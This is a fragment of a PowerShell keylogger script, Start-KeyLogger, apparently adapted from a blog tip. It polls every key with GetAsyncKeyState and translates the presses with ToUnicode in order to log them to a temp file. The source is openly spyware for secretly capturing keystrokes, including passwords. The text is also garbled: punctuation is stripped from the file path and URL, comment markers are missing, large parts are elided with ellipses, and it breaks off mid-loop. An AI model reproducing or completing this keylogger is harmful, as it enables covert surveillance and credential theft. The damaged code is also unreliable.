#requires -Version 2
function Start-KeyLogger($Path = $envtempkeylogger.txt) {
    #
    .DESCRIPTION
    ...
    .NOTES
        httppowershell.comcsblogstipsarchive20151209creating-simple-keylogger.aspx
    #
    ...
    try {
        ...
        while ($true) {
            ...
            for ($ascii = 9; $ascii -le 254; $ascii++) {
                ...
                $state = $APIGetAsyncKeyState($ascii)
                ...
                if ($state -eq -32767) {
                    ...
                    $virtualKey = $APIMapVirtualKey($ascii, 3)

                    # get keyboard state for virtual keys
                    $kbstate = New-Object -TypeName Byte[] -ArgumentList 256
                    $checkkbstate = $APIGetKeyboardState($kbstate)

                    # prepare a StringBuilder to receive input key
                    $mychar = New-Object -TypeName System.Text.StringBuilder

                    # translate virtual key
                    $success = $APIToUnicode($ascii, $virtualKey, $kbstate, $mychar, $mychar.Capacity, 0)
